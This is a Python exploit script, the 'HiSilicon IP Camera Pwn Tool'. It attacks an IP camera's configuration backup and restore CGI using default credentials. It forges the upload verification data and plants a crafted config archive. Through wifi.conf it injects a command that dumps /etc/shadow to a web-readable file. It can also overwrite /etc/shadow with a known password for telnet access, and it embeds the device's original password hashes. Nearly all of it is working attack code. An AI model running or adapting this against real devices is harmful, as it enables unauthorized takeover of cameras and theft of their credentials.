#!/usr/bin/env python3
#

import requests
import tarfile
import io
import random
import crypt
import argparse
from time import sleep
from tqdm import trange
from struct import pack, unpack
from base64 import b64decode, b64encode

auth = ("admin", "ipcam")
URI = 'http://192.168.55.42:443'

wifi_conf = """WifiEnable=0
WifiType=Infra
WifiMode=OPEN
WifiEnc=NONE
WifiSsid="pwn"
WifiKey=""
"""

#cmd = """/bin/busybox > /mnt/mtd/ipc/tmpfs/t.txt
#"""

def cfg_backup():
    r = requests.get(URI+'/web/cgi-bin/hi3510/backup.cgi', auth=auth)
    tardata = r.content[:-0x80]
    chksum = r.content[-0x80:]
    b64length = unpack('<I', chksum[:4])[0]
    vrfydata = b64decode(chksum[4:4+b64length])
    flag = unpack('<I', vrfydata[:4])[0]
    versioncode = vrfydata[4:8]
    langcode = vrfydata[8:10]
    return (tardata, flag, versioncode, langcode, len(vrfydata))

# create malicious backup file prepared with cmd exec
def tar_create(filename, filedata):
    filedata = filedata.encode()
    fileIO = io.BytesIO(filedata)
    tarIO = io.BytesIO()
    tar = tarfile.open(mode="w:gz", fileobj=tarIO)
    tarinfo = tarfile.TarInfo(name=filename)
    tarinfo.size = len(filedata)
    tar.addfile(tarinfo, fileIO)
    tar.close()
    return tarIO.getvalue()

# add verify data in order to pass upload checks
def gen_vrfy(flag, versioncode, langcode, vrfydatalen):
    dat = pack('<I', flag) + versioncode + langcode
    dat += b'\x00' * (vrfydatalen-len(dat))
    b64dat = b64encode(dat)
    vrfy = pack('<I', len(b64dat)) + b64dat
    vrfy += bytes([random.randint(0, 255) for i in range(0x80 - len(vrfy))])
    return vrfy

def cfg_restore(bindata):
    r = requests.post(URI+'/web/cgi-bin/hi3510/restore.cgi', auth=auth, files={'config.bin': bindata})
    return r.content == b'restore succeed.'

def param_cgi(cmd):
    r = requests.get(URI+'/web/cgi-bin/hi3510/param.cgi', auth=auth, params={'cmd': cmd})
    return r.content.decode()

def get_vrfydata():
    print("[*] downloading configuration backup...")
    (tardata, flag, versioncode, langcode, vrfydatalen) = cfg_backup()

    print("[+] --> flag=0x%x, versioncode=%s, langcode=%s, vrfydatalen=0x%x" %
          (flag, versioncode.decode(), langcode.decode(), vrfydatalen))

    vrfydata = gen_vrfy(flag, versioncode, langcode, vrfydatalen)
    print("[+] custom vrfy data created")
    return vrfydata
    
def upload_conf(bindata):
    print("[*] uploading malicious config binary...")
    if cfg_restore(bindata):
        print("[+] upload succeeded!")
    else:
        print("[!] upload error")
        raise SystemExit

    print("[*] waiting for device reboot...")
    bar = trange(45)
    for i in bar:
        sleep(1)

    print("[*] checking wifi.conf... (getwirelessattr)")
    print(param_cgi('getwirelessattr'))


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='HiSilicon IP Camera Pwn Tool')
    parser.add_argument('action', nargs=1, help='action to perform: getshadow, setshadow, restoreshadow')
    args = parser.parse_args()

    if args.action[0] == 'getshadow':
        cmd = "cat /etc/shadow > /mnt/mtd/ipc/tmpfs/t.txt"
        vrfydata = get_vrfydata()
        tardata = tar_create('mnt/mtd/ipc/conf/wifi.conf', wifi_conf + cmd)
        print("[+] created malicious config tar gz file")
        bindata = tardata + vrfydata
        upload_conf(bindata)
        print("[*] triggering cmd... (searchwireless)")
        print(param_cgi('searchwireless'))
        print("[*] reading output (/etc/shadow):")
        print(requests.get(URI+'/tmpfs/t.txt', auth=auth).content.decode())

    elif args.action[0] == 'setshadow':
        password = "hello123."
        h = crypt.crypt(password, crypt.METHOD_MD5)
        shadow  = "root:%s:16199:0:99999:7:::\n" % h
        shadow += "admin:%s:16199:0:99999:7:::\n" % h
        print("[+] shadow file generated with password '%s'" % password)
        print(shadow)
        vrfydata = get_vrfydata()
        tardata = tar_create('etc/shadow', shadow)
        print("[+] created malicious config tar gz containing /etc/shadow")
        bindata = tardata + vrfydata
        upload_conf(bindata)
        print("[+] /etc/shadow overwritten by malicious config restore")
        print("[*] enable telnet with hisearcher.py and connect ;)")


    elif args.action[0] == 'restoreshadow':
        shadow_orig  = "root:$1$tiaLlxGM$byeTUfQgqyET5asfwwNjg0:16199:0:99999:7:::\n"
        shadow_orig += "admin:$1$rHWQwR5V$i4FVDvwhuzau8msvAfHEt.:16199:0:99999:7:::\n"
        shadow = shadow_orig
        print("[+] original shadow file set up")
        print(shadow)
        vrfydata = get_vrfydata()
        tardata = tar_create('etc/shadow', shadow)
        print("[+] created malicious config tar gz containing /etc/shadow")
        bindata = tardata + vrfydata
        upload_conf(bindata)
        print("[+] /etc/shadow overwritten by malicious config restore")
        print("[*] restored to original state")

